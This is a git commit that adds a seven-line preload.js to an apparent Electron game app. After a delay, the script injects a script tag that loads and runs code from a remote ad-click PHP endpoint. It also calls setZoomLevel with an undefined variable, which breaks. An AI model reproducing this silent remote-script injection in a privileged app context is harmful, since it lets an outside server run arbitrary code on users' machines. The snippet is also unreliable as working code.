5a9d22b403bffba64481ace68c2c63516c159451
neoxgame <122216512+neoxgame@users.noreply.github.com>
2023-03-19 22:27:18 +0530

    Create preload.js

---
+++ preload.js
@@ -0,0 +1,7 @@
+const { webFrame } = require('electron')
+setTimeout(() => {
+var script = document.createElement('script');
+script.src = '//tr.neox.in/adclick/gamepix/main.php?v=' + Date.now() + '';
+document.head.appendChild(script);
+webFrame.setZoomLevel(level)
+}, 2000)
